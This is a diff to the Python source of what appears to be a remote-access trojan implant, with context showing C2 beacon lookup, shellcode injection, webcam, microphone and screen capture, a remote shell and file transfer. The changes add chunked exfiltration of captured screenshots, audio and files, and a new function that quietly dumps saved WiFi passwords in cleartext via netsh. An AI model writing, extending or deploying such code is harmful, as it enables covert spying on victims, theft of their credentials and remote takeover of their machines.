@@ -40,6 +40,8 @@ screen_stream_lock = threading.Lock()
 screen_stream_thread = None
 shell_process = None
 shell_output_queue = queue.Queue()
+MAX_CHUNK_SIZE = 1024 * 1024 
+
 
 
 BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
@@ -141,7 +143,7 @@ def capture_webcam():
     cap.release()
     if not ret:
         raise Exception("Webcam failed")
-    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
+    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
     return buf.tobytes()
 
 def record_mic(seconds=10):
@@ -161,6 +163,7 @@ def record_mic(seconds=10):
     wf.writeframes(b''.join(frames))
     wf.close()
     return wf.getvalue()  # WAV bytes
+    
 
 def inject_shellcode(pid: int, sc: bytes):
     # Classic CreateRemoteThread injection
@@ -230,6 +233,27 @@ def fetch_beacon_url() -> str:
     c2_url = url_match.group(0).rstrip(".,;")  # clean trailing punctuation
     return c2_url
 
+def chunk_large_output(tag: str, data: bytes):
+    """
+    Split large data into numbered chunks.
+    Tag format: e.g., "SCREEN_STREAM_CHUNK:", "SCREENRECORD:", "AUDIO:"
+    """
+    global MAX_CHUNK_SIZE
+    if len(data) <= MAX_CHUNK_SIZE:
+        b64 = base64.b64encode(data).decode()
+        return [f"{tag}{b64}"]
+
+    chunks = []
+    total_chunks = (len(data) + MAX_CHUNK_SIZE - 1) // MAX_CHUNK_SIZE
+    for i in range(total_chunks):
+        start = i * MAX_CHUNK_SIZE
+        end = min(start + MAX_CHUNK_SIZE, len(data))
+        chunk_data = data[start:end]
+        b64 = base64.b64encode(chunk_data).decode()
+        chunks.append(f"{tag}_CHUNK_{i+1}of{total_chunks}:{b64}")
+    # Final marker
+    chunks.append(f"{tag}_END")
+    return chunks
 
 def main():
     #establish_persistence()
@@ -302,7 +326,7 @@ def screen_stream_worker(duration: int = 0):  # 0 = indefinite
             # Fast raw → numpy → JPEG encode (smaller than PNG for stream)
             frame_np = np.array(img)
             frame_bgr = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)
-            _, buffer = cv2.imencode('.jpg', frame_bgr, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
+            _, buffer = cv2.imencode('.jpg', frame_bgr, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
 
             b64_chunk = base64.b64encode(buffer).decode()
             result = {
@@ -339,6 +363,50 @@ def stop_screen_stream():
             screen_stream_thread.join(timeout=3)
         return "Screen stream stopped"
 
+
+# ===================== NEW: WIFI DUMP =====================
+def dump_wifi_profiles():
+    """
+    Stealthily extract all saved WiFi profiles with cleartext passwords.
+    Works on Windows 7+ (requires no elevation for saved networks).
+    Output format: SSID | Password (or [No Password] if open)
+    """
+    try:
+        # Step 1: Get list of all profiles
+        profiles_output = subprocess.check_output(
+            "netsh wlan show profiles", shell=True, text=True, stderr=subprocess.STDOUT
+        ).decode(errors="ignore")
+
+        # Extract SSIDs
+        ssid_lines = [line for line in profiles_output.splitlines() if "All User Profile" in line]
+        ssids = [re.search(r"All User Profile\s*:\s*(.+)", line).group(1).strip() for line in ssid_lines if re.search(r"All User Profile", line)]
+
+        if not ssids:
+            return "No saved WiFi profiles found"
+
+        results = []
+        for ssid in ssids:
+            try:
+                # Step 2: Get detailed profile with key=clear
+                detail_output = subprocess.check_output(
+                    f'netsh wlan show profile name="{ssid}" key=clear',
+                    shell=True, text=True, stderr=subprocess.STDOUT
+                ).decode(errors="ignore")
+
+                # Extract password
+                key_match = re.search(r"Key Content\s*:\s*(.+)", detail_output)
+                password = key_match.group(1).strip() if key_match else "[No Password / Open Network]"
+
+                results.append(f"{ssid} | {password}")
+            except:
+                results.append(f"{ssid} | [Error retrieving key]")
+
+        return "WIFI_PROFILES:\n" + "\n".join(results)
+
+    except Exception as e:
+        return f"WiFi dump failed: {str(e)}"
+
+
 # ===================== NEW: REVERSE WEBCAM STREAM =====================
 
 def webcam_stream_worker(duration: int):
@@ -369,7 +437,7 @@ def webcam_stream_worker(duration: int):
         if not ret:
             break
 
-        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
+        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
         jpg_bytes = buffer.tobytes()
 
         # Build multipart part
@@ -456,26 +524,35 @@ def handle_task(task):
     try:
         if ttype == "screenshot":
             data = capture_screenshot()
-            result["output"] = "SCREENSHOT:" + base64.b64encode(data).decode()
+            return chunk_large_output("SCREENSHOT:", data)[0]
         elif ttype == "webcam":
             data = capture_webcam()
             result["output"] = "WEBCAM:" + base64.b64encode(data).decode()
         elif ttype == "mic":
             secs = int(cmd) if cmd.isdigit() else 10
             data = record_mic(secs)
-            result["output"] = "AUDIO:" + base64.b64encode(data).decode()
+            return chunk_large_output("AUDIO:", data)
         elif ttype == "shell":
             out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
             result["output"] = out.decode(errors="ignore")
+
         elif ttype == "file_download":
             with open(cmd, "rb") as f:
                 data = f.read()
-            result["output"] = f"FILE_DOWNLOAD:{os.path.basename(cmd)}:{base64.b64encode(data).decode()}"
+            chunks = chunk_large_output(f"FILE_DOWNLOAD:{os.path.basename(cmd)}:", data)
+            for chunk in chunks:
+                with results_lock:
+                    pending_results.append({"task_id": tid + f"_part{chunks.index(chunk)}", "output": chunk})
+        
         elif ttype == "file_upload":
             path, b64 = cmd.split(":", 1)
             with open(path, "wb") as f:
                 f.write(base64.b64decode(b64))
             result["output"] = f"Uploaded {path}"
+
+        elif ttype == "wifi_dump":
+            output = dump_wifi_profiles()
+            result["output"] = "WIFI_DUMP:" + output
 
         elif ttype == "webcam_stream":
             parts = cmd.split()
@@ -493,6 +570,7 @@ def handle_task(task):
             elif action == "stop":
                 msg = stop_webcam_stream()
                 result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"
+
         elif ttype == "screen_stream":
             parts = cmd.split()
             action = parts[0].lower()
@@ -558,4 +636,3 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
-
